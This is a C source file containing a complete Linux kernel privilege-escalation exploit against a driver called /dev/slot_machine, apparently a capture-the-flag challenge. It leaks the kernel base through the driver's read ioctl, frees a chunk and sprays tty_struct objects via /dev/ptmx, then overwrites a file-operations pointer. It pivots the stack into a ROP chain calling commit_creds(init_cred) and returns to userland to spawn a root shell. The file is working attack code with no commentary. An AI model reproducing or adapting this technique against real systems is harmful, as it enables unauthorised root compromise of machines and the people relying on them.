#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/msg.h>


#define CMD_ALLOC 0
#define CMD_KFREE 1
#define CMD_READ 1337
#define CMD_WRITE 3

uint64_t chunk_size = 0x2e0;
uint64_t kbuff[0x150];

int fd;
int ptmx_fds[10];

/* kernel addresses */
uint64_t kbase;
uint64_t commit_creds;
uint64_t fake_fops;
uint64_t *ROP;
uint64_t init_cred;
uint64_t swapgs;
uint64_t rop_addr;

/* userland registers */
uint64_t u_cs;
uint64_t u_ss;
uint64_t u_rsp;
uint64_t u_rip;
uint64_t u_rflags;

/* gadgets! */
//pop rdi; ret;
uint64_t pop_rdi;

//push rdx; pop rsp; pop rbp; ret;
uint64_t push_rdx;


void calculate_addr() {

    kbase = kbuff[4] - 0x6242e0;
    commit_creds = kbase + 0x27c9d0;
    pop_rdi = kbase + 0x507fed;
    push_rdx = kbase + 0x25a04a;
    init_cred = kbase + 0x838f40;
    swapgs = kbase + 0x153b;

    printf("  [!] kbase - 0x%lx\n", kbase);
    printf("  [!] commit_creds - 0x%lx\n", commit_creds);
    printf("  [!] pop_rdi - 0x%lx\n", pop_rdi);
    printf("  [!] push_rdx - 0x%lx\n", push_rdx);
    printf("  [!] init_cred - 0x%lx\n", init_cred);
}

int got_root() {
    char *args[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", args, NULL);
}

void ROP_inject() {
    fake_fops = kbuff[8];
    kbuff[20] = push_rdx;
    kbuff[4] = fake_fops;
    rop_addr = kbuff[22];

    ROP = (uint64_t *) &kbuff[22];
    *ROP++ = 0;
    *ROP++ = pop_rdi;
    *ROP++ = init_cred;
    *ROP++ = commit_creds;
    *ROP++ = swapgs;
    *ROP++ = (uint64_t) got_root;
    *ROP++ = u_cs;
    *ROP++ = u_rflags;
    *ROP++ = u_rsp;
    *ROP++ = u_ss;
}


/* struct which is needed to read/write to the kernel space */
struct {
    uint64_t offset;
    uint64_t size;
    uint64_t buff;
} kernel_buff = {0};

void save_userland() {
    __asm__(
            ".intel_syntax noprefix;"
            "mov u_cs, cs;"
            "mov u_ss, ss;"
            "mov u_rsp, rsp;"
            "pushf;"
            "pop u_rflags;"
            ".att_syntax;"
            );

    puts("[+] saved userland space!");
}

void fatal(const char *msg) {
    perror(msg);
    exit(1);
}


void ioctl_alloc() {
    
    if (ioctl(fd, CMD_ALLOC, &chunk_size) < 0)
        fatal("ioctl");
}

void dev_write() {
    int ret;

    kernel_buff.offset = 0;
    kernel_buff.size = 0x150;

    kernel_buff.buff = (uint64_t) kbuff;

    if ((ret = ioctl(fd, CMD_WRITE, &kernel_buff)) < 0) {
        printf("[-] failed to perform write, ret: %d\n", ret);
        fatal("ioctl(write)");
    }
    puts("[+] performed write");

}

void dev_read() {

    int ret;

    kernel_buff.offset = 0;
    kernel_buff.size = 0x100;
    kernel_buff.buff = (uint64_t) kbuff;

    memset(kbuff, 0x00, sizeof(kbuff));

    if ((ret = ioctl(fd, CMD_READ, &kernel_buff)) < 0) {
        printf("[-] failed to perform read, ret: %d\n", ret);
        fatal("ioctl");
    }

    puts("[+] performed read");

}

void dump_kstack() {

    for (int i = 0; i < 50; i++)
        printf("kbuff[%d] = 0x%lx\n", i, kbuff[i]);

}

void ioctl_free() {

    if (ioctl(fd, CMD_KFREE) < 0) {
        puts("[-] failed to kfree the chunk!");
    }
    puts("[+] freed the chunk :)");
}

void spray_ptmx() {

    for (int i = 0; i < 10; i++) {
        if ((ptmx_fds[i] = open("/dev/ptmx", O_RDWR)) < 0)
            fatal("open");
    }

    puts("[+] sprayed tty_struct 10 times!");
}

void ptmx_ioctl() {

    for (int i = 0; i < 10; i++) {
        printf("[~] ioctl ptmx %d\n...", i);
        ioctl(ptmx_fds[i], 0xdeadbabe, rop_addr);
    }
}


int main() {

    save_userland();

    if ((fd = open("/dev/slot_machine", O_RDWR)) < 0)
        fatal("open");

    puts("[+] opened /dev/slot_machine");

    ioctl_alloc();
    puts("[+] allocated chunk");

    dev_write();
    dev_read();
    ioctl_free();
    spray_ptmx();
    dev_read();
//    dump_kstack();

    calculate_addr();

   ROP_inject();
    dev_write();
//    dump_kstack();
    ptmx_ioctl();

    return 0;
}
